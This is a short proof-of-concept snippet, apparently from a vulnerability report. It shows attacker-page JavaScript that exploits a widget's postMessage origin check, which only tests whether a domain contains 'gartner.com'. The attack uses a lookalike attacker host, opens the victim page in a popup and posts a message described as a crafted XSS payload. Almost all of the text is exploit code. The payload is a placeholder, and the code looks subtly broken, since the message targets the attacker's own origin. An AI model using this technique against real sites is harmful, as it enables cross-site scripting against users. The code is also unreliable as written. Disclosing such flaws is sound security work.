To exploit the initial vulnerability (domain contains 'gartner.com'): 
Attacker page JS:
```javascript
const attackerDomain = 'https://gartner.com.attacker.com'; // Or any domain matching the pattern
const victimUrl = '<TARGET_URL>'; // The URL of the site embedding the Gartner widget

const popupWindow = window.open(victimUrl, '_blank');

popupWindow.onload = () => {
  const maliciousMessage = 'some_data_here'; // This would be a crafted payload for XSS
  popupWindow.postMessage(maliciousMessage, attackerDomain);
};
```

